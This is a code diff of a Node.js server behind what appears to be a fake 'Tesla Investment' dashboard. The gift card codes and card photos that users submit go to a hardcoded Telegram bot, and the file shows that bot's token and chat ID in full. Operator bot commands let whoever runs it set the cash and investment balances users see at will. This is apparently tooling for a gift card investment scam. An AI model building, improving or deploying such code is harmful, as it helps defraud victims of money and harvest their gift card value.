@@ -4,6 +4,7 @@ const bodyParser = require('body-parser');
 const multer = require('multer');
 const path = require('path');
 const fetch = require('node-fetch');
+const FormData = require('form-data');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -11,8 +12,8 @@ const PORT = process.env.PORT || 3000;
 // ============================================
 // TELEGRAM BOT CONFIGURATION
 // ============================================
-const TELEGRAM_BOT_TOKEN = '8800607663:AAGUaWeu51iSMvB42rdlkJcIGR9jO9H7cXU'; // Replace with your bot token
-const TELEGRAM_CHAT_ID = '157828443';     // Replace with your chat ID
+const TELEGRAM_BOT_TOKEN = '8800607663:AAGUaWeu51iSMvB42rdlkJcIGR9jO9H7cXU';
+const TELEGRAM_CHAT_ID = '157828443';
 const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
 // ============================================
@@ -26,11 +27,11 @@ app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 const storage = multer.memoryStorage();
 const upload = multer({ 
   storage: storage,
-  limits: { fileSize: 10 * 1024 * 1024 } // 10MB limit
+  limits: { fileSize: 10 * 1024 * 1024 }
 });
 
 // ============================================
-// USER DATA STORE (In production, use a database)
+// USER DATA STORE
 // ============================================
 let userData = {
   name: 'Dennis Newhouse',
@@ -77,7 +78,7 @@ let validGiftCards = {
 };
 
 // ============================================
-// TELEGRAM BOT FUNCTIONS
+// TELEGRAM FUNCTIONS
 // ============================================
 async function sendTelegramMessage(text) {
   try {
@@ -90,16 +91,19 @@ async function sendTelegramMessage(text) {
         parse_mode: 'HTML'
       })
     });
-    return await response.json();
+    const data = await response.json();
+    if (!data.ok) {
+      console.error('Telegram API error:', data.description);
+    }
+    return data;
   } catch (error) {
-    console.error('Telegram send error:', error);
+    console.error('Telegram send error:', error.message);
     return null;
   }
 }
 
 async function sendTelegramPhoto(caption, imageBuffer) {
   try {
-    const FormData = require('form-data');
     const form = new FormData();
     form.append('chat_id', TELEGRAM_CHAT_ID);
     form.append('caption', caption);
@@ -111,9 +115,13 @@ async function sendTelegramPhoto(caption, imageBuffer) {
       body: form,
       headers: form.getHeaders()
     });
-    return await response.json();
+    const data = await response.json();
+    if (!data.ok) {
+      console.error('Telegram photo error:', data.description);
+    }
+    return data;
   } catch (error) {
-    console.error('Telegram photo send error:', error);
+    console.error('Telegram photo send error:', error.message);
     return null;
   }
 }
@@ -179,8 +187,20 @@ function formatImageUploadMessage(imageData) {
 <i>The image is attached below. You can manually verify and process this gift card.</i>`;
 }
 
+async function sendTelegramMessageToChat(chatId, text) {
+  try {
+    await fetch(`${TELEGRAM_API}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
+    });
+  } catch (error) {
+    console.error('Send to chat error:', error.message);
+  }
+}
+
 // ============================================
-// TELEGRAM BOT WEBHOOK (Optional - for receiving commands)
+// TELEGRAM BOT WEBHOOK
 // ============================================
 app.post('/telegram-webhook', async (req, res) => {
   try {
@@ -190,7 +210,6 @@ app.post('/telegram-webhook', async (req, res) => {
       const chatId = message.chat.id;
       const text = message.text.trim();
       
-      // Handle bot commands
       if (text === '/start' || text === '/help') {
         const helpText = `<b>🤖 Tesla Investment Bot Commands:</b>
 
@@ -204,7 +223,6 @@ app.post('/telegram-webhook', async (req, res) => {
 /removegiftcard [code] - Remove a gift card
 /reset - Reset all data to default
 /help - Show this help message`;
-
         await sendTelegramMessageToChat(chatId, helpText);
       }
       else if (text === '/balance') {
@@ -324,23 +342,10 @@ app.post('/telegram-webhook', async (req, res) => {
   }
 });
 
-async function sendTelegramMessageToChat(chatId, text) {
-  try {
-    await fetch(`${TELEGRAM_API}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
-    });
-  } catch (error) {
-    console.error('Send to chat error:', error);
-  }
-}
-
 // ============================================
 // API ROUTES FOR DASHBOARD
 // ============================================
 
-// Get user data
 app.get('/api/user-data', (req, res) => {
   res.json({
     success: true,
@@ -350,7 +355,6 @@ app.get('/api/user-data', (req, res) => {
   });
 });
 
-// Execute trade
 app.post('/api/trade', async (req, res) => {
   try {
     const { asset, type, amount } = req.body;
@@ -393,7 +397,6 @@ app.post('/api/trade', async (req, res) => {
     
     if (transactions.length > 50) transactions.pop();
     
-    // Send to Telegram
     const tradeData = { asset, type, amount };
     await sendTelegramMessage(formatTradeMessage(tradeData));
     
@@ -408,7 +411,6 @@ app.post('/api/trade', async (req, res) => {
   }
 });
 
-// Redeem gift card
 app.post('/api/redeem-gift', async (req, res) => {
   try {
     const { code } = req.body;
@@ -436,7 +438,6 @@ app.post('/api/redeem-gift', async (req, res) => {
       
       delete validGiftCards[normalizedCode];
       
-      // Send to Telegram
       await sendTelegramMessage(formatGiftMessage({ code: normalizedCode, amount: creditAmount }));
       
       res.json({
@@ -453,13 +454,11 @@ app.post('/api/redeem-gift', async (req, res) => {
   }
 });
 
-// Upload gift card image
 app.post('/api/upload-gift-image', upload.single('giftImage'), async (req, res) => {
   try {
     const code = req.body.code || '';
     const imageBuffer = req.file.buffer;
     
-    // Send image and details to Telegram
     const caption = formatImageUploadMessage({ code });
     await sendTelegramPhoto(caption, imageBuffer);
     
@@ -472,7 +471,6 @@ app.post('/api/upload-gift-image', upload.single('giftImage'), async (req, res) 
   }
 });
 
-// Update balance from bot
 app.post('/api/update-balance', async (req, res) => {
   try {
     const { availableCash, investmentsValue, giftCredits } = req.body;
@@ -493,11 +491,7 @@ app.post('/api/update-balance', async (req, res) => {
   }
 });
 
-// ============================================
-// START SERVER
-// ============================================
 app.listen(PORT, () => {
   console.log(`🚀 Tesla Investment Server running on port ${PORT}`);
-  console.log(`📡 Telegram Bot: ${TELEGRAM_BOT_TOKEN ? 'Configured' : 'Not configured'}`);
-  console.log(`🤖 Bot commands: /balance, /trades, /addcash, /setcash, /setinvested, /setgift, /addgiftcard, /removegiftcard, /reset, /help`);
+  console.log(`📡 Telegram Bot configured`);
 });
